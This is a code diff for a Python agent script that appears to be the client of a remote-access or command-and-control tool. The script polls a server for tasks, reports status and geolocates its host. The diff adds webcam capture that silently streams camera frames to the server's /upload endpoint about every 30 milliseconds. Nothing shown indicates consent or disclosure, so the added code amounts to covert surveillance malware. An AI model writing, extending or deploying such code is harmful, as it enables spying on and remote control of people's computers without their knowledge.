@@ -1,7 +1,8 @@
-import time, uuid,requests,platform,psutil,os,subprocess,asyncio
+import time, uuid,requests,platform,psutil,os,subprocess,asyncio,cv2
 
 from datetime import timedelta
 
+cap = cv2.VideoCapture(0)
 SERVER_URL = "http://127.0.0.1:5000"
 #AGENT_ID = str(uuid.uuid4())
 AGENT_ID = "a3d48220-27d8-4551-bb36-157433163ad1"
@@ -13,6 +14,18 @@ headers = {
         "Authorization": f"Bearer {AGENT_ID}",
         "X-Session-ID": f"{AGENT_ID}"
 }
+
+def camera():
+    ret, frame = cap.read()
+
+    success, encoded_img = cv2.imencode('.jpg', frame)
+
+    files = {'image': ('frame.jpg', encoded_img.tobytes(), 'image/jpeg')}
+        
+    try:
+        response = requests.post(SERVER_URL+"/upload", files=files, timeout=1)
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending frame: {e}")
 
 def get_country():
     get_region = requests.get("https://www.whatismyip.net/geoip/")
@@ -64,10 +77,11 @@ def status():
 
 
 def main():
-    while 1:
+    while 1 and cap.isOpened():
         status()
         get_task()
-        time.sleep(5)
+        camera()
+        time.sleep(0.03)
 
 if "__main__" == __name__:
     main()
